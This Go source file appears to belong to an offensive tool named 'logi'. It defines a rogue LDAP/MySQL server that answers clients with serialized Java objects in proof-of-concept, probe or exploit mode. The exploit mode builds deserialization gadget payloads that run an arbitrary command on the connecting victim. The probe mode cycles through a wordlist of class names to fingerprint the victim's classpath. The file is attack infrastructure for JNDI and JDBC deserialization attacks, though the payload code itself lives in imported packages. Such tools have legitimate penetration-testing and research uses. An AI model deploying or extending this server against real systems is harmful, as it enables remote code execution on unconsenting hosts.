package server

import (
	"sync"

	"github.com/cokeBeer/logi/pkg/payload"
	"github.com/cokeBeer/logi/pkg/wordlist"
)

const (
	TYPE_LDAP = iota + 1
	TYPE_MYSQL
)

const (
	MODE_POC = iota + 1
	MODE_PROBE
	MODE_EXPLOIT
)

// Server represents a LDAP/MySQL server
type Server struct {
	Mode    int
	lock    sync.Mutex
	counter int
	ip      string
	port    string
	Domain  string
	Dict    *wordlist.DictWrapper
	Gadget  *payload.ExecWrapper
	Command string
	Type    int
}

// New returns a Server
func New(ip string, port string) *Server {
	s := new(Server)
	s.ip = ip
	s.port = port
	s.counter = 0
	return s
}

func (s *Server) payloadByMode(classname string) []byte {
	var serobj []byte
	if s.Mode == MODE_PROBE {
		probeclass := s.decide()
		serobj = payload.Probe(s.Domain, probeclass, classname)
	} else if s.Mode == MODE_EXPLOIT {
		serobj = s.Gadget.Exec(s.Command)
	} else {
		serobj = payload.Poc(s.Domain, classname)
	}
	return serobj
}

func (s *Server) decide() string {
	var i int
	s.lock.Lock()
	s.counter++
	if s.counter >= s.Dict.Len() {
		s.counter = 0
	}
	i = s.counter
	s.lock.Unlock()
	return s.Dict.Choose(i)
}
